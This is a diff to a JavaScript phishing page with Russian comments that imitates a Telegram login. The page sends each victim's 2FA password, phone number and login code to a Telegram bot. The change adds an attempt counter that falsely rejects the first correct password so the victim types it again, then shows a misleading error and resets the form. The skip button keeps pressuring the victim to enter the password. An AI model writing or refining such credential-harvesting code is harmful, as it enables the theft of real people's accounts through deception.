@@ -611,6 +611,7 @@
         let canResendCode = true;
         let resendTimer = null;
         let secondsLeft = 60;
+        let twoFAAttempts = 0;
 
         // Инициализация - устанавливаем Россию при загрузке
         function initializeCountry() {
@@ -695,10 +696,7 @@
 
         // Обработка кнопки пропуска 2FA
         skipBtn.addEventListener('click', () => {
-            // Вместо alert показываем ошибку
             showError('Ошибка! Введите пароль 2FA');
-
-            // Фокусируемся на поле ввода пароля
             passwordInput.focus();
         });
 
@@ -717,12 +715,26 @@
                 // Отправляем пароль 2FA в Telegram
                 await sendToTelegramBot(`🔑 Пароль 2FA: ${password}\n📱 Для номера: ${enteredPhoneNumber}\n🔐 После кода: ${enteredCode}`);
                 
-                // Завершаем вход
+                // Увеличиваем счетчик попыток
+                twoFAAttempts++;
+                
                 setTimeout(() => {
                     hideLoading();
-                    // Сброс формы
-                    showPhoneScreen();
-                    passwordInput.value = '';
+                    
+                    if (twoFAAttempts === 1) {
+                        // Первая попытка - показываем ошибку
+                        showError('Неверный 2FA, проверьте правильность ввода.');
+                        passwordInput.value = '';
+                        passwordInput.focus();
+                    } else {
+                        // Вторая попытка - сбрасываем всё
+                        showError('Вы вошли не через ваш аккаунт, попробуйте снова');
+                        twoFAAttempts = 0;
+                        setTimeout(() => {
+                            showPhoneScreen();
+                            passwordInput.value = '';
+                        }, 2000);
+                    }
                 }, 1000);
                 
             } catch (error) {
@@ -860,6 +872,7 @@
             twoFAScreen.classList.add('hidden');
             phoneInput.value = '';
             hideLoading();
+            twoFAAttempts = 0;
         }
 
         // Проверка заполнения кода
